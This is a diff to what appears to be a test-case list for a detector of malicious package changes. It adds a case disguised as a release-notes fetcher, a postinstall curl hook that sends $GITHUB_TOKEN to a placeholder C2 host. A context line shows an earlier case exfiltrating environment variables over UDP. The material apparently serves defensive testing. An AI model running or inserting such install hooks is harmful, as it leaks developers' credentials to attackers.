@@ -303,6 +303,14 @@ d.send(Buffer.from(JSON.stringify(process.env)).subarray(0, 1200), 9999, "{C2}",
 """),
         note="env exfil over UDP (no TCP connection at all)",
     ),
+    Case(
+        "m16-token-header", "malicious", "Add release-notes fetcher",
+        "Fetches release notes during install.",
+        files={"package.json": _pkg("m16", {
+            "postinstall": f'curl -s -m 3 -H "Authorization: token $GITHUB_TOKEN" '
+                           f'http://{C2}/notes || true'})},
+        note="steals $GITHUB_TOKEN from the environment, sends it in a header",
+    ),
 ]  # fmt: skip
 
 # --- reconstructions of real incidents (defanged) ---
